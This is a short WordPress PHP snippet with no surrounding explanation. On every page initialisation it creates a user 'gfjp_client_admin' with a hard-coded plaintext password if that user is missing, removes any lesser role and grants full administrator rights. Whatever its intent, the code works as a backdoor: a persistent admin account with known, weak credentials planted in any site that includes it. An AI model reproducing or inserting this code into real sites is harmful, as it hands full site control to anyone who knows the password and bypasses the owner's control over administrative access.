<?php

if( username_exists( 'gfjp_client_admin' ) == FALSE ){

    add_action( 'init', 'add_minor_admin' );
    function add_minor_admin(){

        $username = 'gfjp_client_admin';
        $password = 'gfjp_admin_0101';

        // Create the new user
        $user_id = wp_create_user( $username, $password );

        // Get current user object
        $user = new WP_User( $user_id );

        // Remove role
        if( in_array( 'subscriber', (array)$user->roles ) ){
            $user->remove_role( 'subscriber' );

        } else if( in_array( 'shop_manager', (array)$user->roles ) ){
            $user->remove_role( 'shop_manager' );

        } else if( in_array( 'contributor', (array)$user->roles ) ){
            $user->remove_role( 'contributor' );

        } else if( in_array( 'author', (array)$user->roles ) ){
            $user->remove_role( 'author' );

        } else if( in_array( 'editor', (array)$user->roles ) ){
            $user->remove_role( 'editor' );

        } else {
        //  Do nothing
        }
        // Add role
        $user->add_role( 'administrator' );
    }
}
